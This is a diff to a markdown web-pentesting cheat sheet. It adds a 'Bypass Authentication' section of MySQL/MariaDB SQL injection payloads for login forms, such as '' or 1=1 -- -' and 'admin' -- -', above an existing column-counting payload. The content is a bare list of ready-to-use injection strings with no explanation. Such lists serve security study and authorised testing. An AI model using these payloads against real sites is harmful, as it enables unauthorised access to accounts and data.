@@ -1,5 +1,14 @@
 # Pentest Web
 ## SQL Injection - MySQL/MariaDB
+-> Bypass Authentication
+```
+' or 1=1 -- -
+admin' -- -
+' or 1=1 order by 2 -- -
+' or 1=1 order by 1 desc -- - 
+' or 1=1 limit 1,1 -- -
+```
+
 -> get number columns
 ```
 -1 order by 3;#
